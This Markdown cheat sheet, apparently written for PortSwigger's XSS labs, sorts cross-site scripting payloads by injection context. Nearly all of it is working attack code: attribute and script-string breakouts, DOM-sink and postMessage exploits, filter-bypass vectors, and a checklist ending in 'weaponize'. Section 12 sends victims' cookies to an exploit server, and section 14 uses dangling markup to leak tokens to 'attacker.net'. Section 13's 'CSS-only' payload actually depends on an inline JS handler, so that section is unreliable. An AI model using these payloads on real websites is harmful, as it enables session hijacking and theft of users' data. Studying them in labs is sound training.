# Cross-Site Scripting (XSS) — Cheat Sheet
Companion to PortSwigger's interactive cheat sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
(That page is a filterable, auto-updated vector list — use it live for filter-bypass fuzzing.
This file is a static, offline-usable reference organized by the situation you're in.)

---

## 1. Baseline PoC payloads (nothing filtered)

```html
<script>alert(1)</script>
<script>print()</script>              <!-- use inside cross-origin iframes (Chrome 92+) -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
```

## 2. Context: between HTML tags

```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(document.domain)>
```

## 3. Context: inside a tag attribute (value reflected in `value="HERE"`)

```html
"><script>alert(1)</script>
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
" onfocus="alert(1)" autofocus="
```
If angle brackets are HTML-encoded but quotes are not → you can't add a new tag, but you
*can* break out of the attribute and add a new event-handler attribute (as above).

## 4. Context: inside `<a href="HERE">`

```html
javascript:alert(1)
" onclick="alert(1)
```

## 5. Context: inside a `<script>` block (data in a JS string)

```js
'-alert(1)-'
';alert(1)//
';alert(1);var a='
</script><script>alert(1)</script>
```
Pick based on what's encoded: if `<`/`>` are HTML-encoded but the string escape isn't handled,
break the string; if backslash-escaping of quotes is applied, look for ways to avoid needing
a quote at all (e.g. template literals, or terminate the script tag itself).

## 6. Context: JS template literal `` `...HERE...` ``

```js
${alert(1)}
${'x'.constructor.constructor('alert(1)')()}
```

## 7. When angle brackets are blocked/encoded but some tags/attrs survive filtering

Fuzz with Burp Intruder (free in Community) against PortSwigger's tag/attribute list, or try:

```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a>
<details open ontoggle=alert(1)>
<xss id=x onfocus=alert(document.cookie) tabindex=1></xss>#x
```

## 8. Custom tags (when only `<custom-tag>` style survives a strict allow-list of characters)

```html
<xss id=x onfocus=alert(document.cookie) tabindex=1>#x
```
Then navigate/redirect so the element gets focus (`location = url + '#x'`), triggering
`onfocus`.

## 9. AngularJS sandbox escape (client-side template injection, `{{ }}` contexts)

```
{{constructor.constructor('alert(1)')()}}
```
If quotes are blocked, string-free variants and CSP-bypass variants exist on PortSwigger's
live cheat sheet under "AngularJS" filters — copy the exact vector from there since it is
regularly updated as browsers change.

## 10. DOM XSS — sink-specific payloads

| Sink | Trigger payload (as URL param / hash value) |
|---|---|
| `document.write()` | `<img src=1 onerror=alert(1)>` |
| `.innerHTML` | `<img src=1 onerror=alert(1)>` (note: `<script>` via innerHTML does **not** execute — use an event-handler tag instead) |
| `eval()` | close any wrapping code, e.g. `');alert(1);//` |
| jQuery `.html()` / selector sink | `<img src=1 onerror=alert(1)>` or `#<img src=1 onerror=alert(1)>` for hashchange-driven selector sinks |
| `location`/`location.href` (JS URL sink) | `javascript:alert(1)` |

## 11. DOM XSS via `postMessage` (web messages)

If the page listens with `window.addEventListener('message', ...)` and passes data to a sink
without checking `event.origin`, send from a page you control (e.g. the lab's exploit server):

```html
<iframe src="https://VULNERABLE-HOST/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(document.domain)>','*')">
```
For a JSON-based handler expecting `{"data":"...","type":"..."}`:
```html
<script>
  var win = window.open('https://VULNERABLE-HOST/');
  setTimeout(function(){
    win.postMessage('{"data":"<img src=1 onerror=alert(1)>","type":"update"}', '*');
  }, 2000);
</script>
```

## 12. Cookie theft template (self-contained, no external OOB service required)

Some labs let you exfiltrate to the lab's own "exploit server" (built into the lab, free,
not Burp Collaborator):

```html
<script>
  fetch('https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?c=' + document.cookie);
</script>
```
or, avoiding CORS issues entirely:
```html
<script>document.location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?c='+document.cookie</script>
```

## 13. Stealing data via CSS-only exfiltration (when script tags are fully blocked)

```html
<style>
  @keyframes x{from{left:0}to{left:1000px}}
  :target{animation:10s x}
</style>
<xss id=x style=animation-name:x onanimationstart=alert(1)></xss>
```
Useful against strict CSPs that block `script-src` but not `style-src`.

## 14. Dangling markup (no JS execution needed — bypasses most CSPs)

```html
<img src="https://attacker.net/log?
```
Everything the browser parses afterward, up to the next unescaped `"`, gets sent to
`attacker.net` as part of the query string. Good for leaking CSRF tokens embedded later
in the same page.

## 15. Quick decision checklist

1. Reflect a unique marker string, find where it lands (view-source / dev tools).
2. Is it inside an HTML tag body, an attribute, or a script block? → pick the matching
   section above.
3. What gets encoded? Only `<`/`>`? Quotes too? Test each character individually.
4. If tags are filtered, check what survives with Burp Intruder against a fuzz list.
5. If a CSP header is present, check `Content-Security-Policy` value for `unsafe-inline`,
   whitelisted JSONP/CDN endpoints, or nonce/hash mistakes.
6. Confirm with `alert(document.cookie)` or `print()`, then (if the lab requires
   exploitation, not just detection) weaponize with fetch()/postMessage/dangling markup.
